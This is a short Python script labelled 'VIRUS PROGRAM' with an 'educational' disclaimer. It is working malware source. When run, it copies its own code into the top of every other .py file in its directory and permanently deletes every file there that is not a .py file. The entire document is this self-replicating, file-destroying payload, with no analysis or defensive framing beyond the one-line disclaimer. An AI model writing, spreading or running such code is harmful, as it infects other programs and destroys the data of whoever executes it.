# !/usr/bin/python3

import os
from sys import argv

# === VIRUS PROGRAM ===

# DESCRIPTION : Infects .py files and deletes all other files in its directory.

# DISCLIAMER : This script must be used only for educational reference and must not be used in other computers.

infection = open(argv[0])
infected_code = infection.readlines()
infection.close()

path = os.path.dirname(os.path.realpath(__file__))
flag = 0
 
for filename in os.listdir(path):
	if filename[-3:-1] + filename[-1] == ".py":
		new_file = open(filename)
		newfile_data = new_file.readlines()
		for line in newfile_data:
			if line != "# === VIRUS PROGRAM ===\n" :
				flag = 1
			else :
				flag = 0
				break
		new_file.close()
		if flag == 1:
			new_file = open(filename, "w")			
			new_file.seek(0)
			new_file.writelines(infected_code)
			new_file.writelines(newfile_data)
			new_file.close()
	else :
		os.remove(filename)

